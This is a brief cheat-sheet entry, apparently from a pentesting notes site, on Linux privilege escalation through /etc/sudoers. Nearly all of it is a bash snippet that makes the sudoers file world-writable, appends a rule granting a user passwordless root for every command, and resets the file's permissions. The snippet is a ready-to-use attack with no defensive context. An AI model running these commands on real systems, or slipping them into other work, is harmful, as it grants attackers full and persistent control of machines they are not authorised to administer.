---
title: "sudoers"
date: 2024-7-3
tags: ["sudoers", "sudo", "privesc", "/etc/sudoers"]
---

---
### Privesc

#### Abuse `/etc/sudoers`

```bash
# IF you have control over `/etc/sudoers`
chmod 666 /etc/sudoers
echo 'user   ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
chmod 440 /etc/sudoers
```

<br>
